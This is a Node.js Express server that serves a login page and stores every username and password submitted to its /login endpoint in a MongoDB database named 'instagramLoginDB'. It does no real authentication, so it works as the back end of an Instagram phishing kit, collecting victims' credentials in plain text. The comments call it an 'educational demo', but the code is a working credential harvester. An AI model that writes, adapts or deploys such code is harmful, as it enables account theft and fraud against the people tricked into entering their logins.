const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

// Connect to MongoDB (update connection string if using cloud MongoDB)
mongoose.connect('mongodb://localhost:27017/instagramLoginDB', {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log('Connected to MongoDB'))
.catch(err => console.log('MongoDB connection error:', err));

// Define a simple User schema (for educational purposes; in reality, hash passwords)
const userSchema = new mongoose.Schema({
  username: String,
  password: String  // WARNING: Do not store plain text passwords in production!
});

const User = mongoose.model('User', userSchema);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (for frontend)
app.use(express.static(path.join(__dirname, 'public')));

// Route to serve the login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint to handle login form submission and store in DB
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    const newUser = new User({ username, password });
    await newUser.save();
    res.status(201).json({ message: 'User data saved successfully (for educational demo)' });
  } catch (error) {
    res.status(500).json({ message: 'Error saving user data' });
  }
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
